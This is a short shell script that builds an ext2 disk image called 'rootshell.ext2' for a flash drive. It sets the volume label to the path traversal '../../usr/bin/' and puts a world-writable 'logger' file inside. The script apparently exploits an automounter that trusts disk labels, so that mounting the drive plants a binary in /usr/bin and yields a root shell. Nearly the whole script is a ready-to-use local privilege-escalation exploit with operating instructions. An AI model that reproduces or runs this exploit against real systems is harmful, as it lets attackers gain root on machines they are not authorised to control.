#requires e2tools

#make 8mb image
dd if=/dev/zero of=./rootshell.ext2 bs=1024 count=8192
#make ext2 from it , all zero UUID means no UUID, label is dir traversal
mke2fs rootshell.ext2 -U 00000000-0000-0000-0000-000000000000 -L "../../usr/bin/"
e2cp -P 777 logger rootshell.ext2:/
echo "======================================"
echo "Rootshell file system prepared. Insert flash drive and do:"
echo "$ sudo dd if=./rootshell.ext2 of=/dev/sd#"
echo "Make sure to replace sd# with your actuall flash drive and don't overwrite your system drive!!!"
echo "======================================"
